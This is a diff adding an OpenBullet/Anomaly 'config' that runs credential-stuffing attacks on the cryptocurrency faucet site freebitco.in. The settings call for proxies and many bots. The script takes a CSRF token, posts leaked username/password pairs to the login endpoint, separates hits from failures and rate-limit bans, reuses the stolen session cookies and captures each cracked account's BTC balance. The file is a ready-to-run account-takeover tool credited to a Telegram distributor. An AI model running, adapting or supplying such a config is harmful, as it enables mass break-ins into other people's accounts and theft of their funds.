@@ -1,0 +1,137 @@
+[SETTINGS]
+{
+  "Name": "freebitco.in",
+  "SuggestedBots": 70,
+  "MaxCPM": 0,
+  "LastModified": "2021-08-14T15:09:42.2492755+04:30",
+  "AdditionalInfo": "https://t.me/Hogo_Victor",
+  "Author": "@Hogo_Victor",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Author Telegram Id:@Hogo_Victor | Telegram Channel: @Open_Bullet_Config",
+      "VariableName": "",
+      "Id": 1143087675
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get REQUEST GET "https://freebitco.in/?op=signup_page" 
+  
+  HEADER "Host: freebitco.in" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Dnt: 1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Te: trailers" 
+
+#Login REQUEST POST "https://freebitco.in/" EncodeContent=TRUE 
+  CONTENT "csrf_token=<COOKIES(csrf_token)>&op=login_new&btc_address=<USER>&password=<PASS>&tfa_code=" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Host: freebitco.in" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-Csrf-Token: <COOKIES(csrf_token)>" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Content-Length: 101" 
+  HEADER "Origin: https://freebitco.in" 
+  HEADER "Dnt: 1" 
+  HEADER "Referer: https://freebitco.in/?op=signup_page" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Te: trailers" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" MatchesRegex "(^s\\:)(\\S*)" 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect login details" 
+  KEYCHAIN Ban OR 
+    KEY "Too many tries." 
+
+#Address PARSE "<SOURCE>" LR "s:" ":" -> VAR "Address" 
+
+#password PARSE "<SOURCE>" REGEX "(^s\\:)(\\w*)\\:(\\w*)\\:(\\w*)\\:(\\w*)" "[3]" -> VAR "password" 
+
+#userid PARSE "<SOURCE>" REGEX "(^s\\:)(\\w*)\\:(\\w*)\\:(\\w*)\\:(\\w*)" "[4]" -> VAR "userid" 
+
+#session PARSE "<SOURCE>" REGEX "(^s\\:)(\\w*)\\:(\\w*)\\:(\\w*)\\:(\\w*)" "[5]" -> VAR "session" 
+
+#Get REQUEST GET "https://freebitco.in/?op=home" 
+  
+  COOKIE "csrf_token: <COOKIES(csrf_token)>" 
+  COOKIE "btc_address: <Address>" 
+  COOKIE "password: <password>" 
+  COOKIE "fbtc_userid: <userid>" 
+  COOKIE "fbtc_session: <session>" 
+  HEADER "Host: freebitco.in" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Dnt: 1" 
+  HEADER "Referer: https://freebitco.in/?op=signup_page" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Te: trailers" 
+
+#Balance PARSE "<SOURCE>" LR "<span id=\"balance\">" "</span>" CreateEmpty=FALSE -> CAP "Balance" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Balance>" EqualTo "0.00000000" 
+
+#Config_By FUNCTION Constant "@Hogo_Victor" -> CAP "Config By" 
+
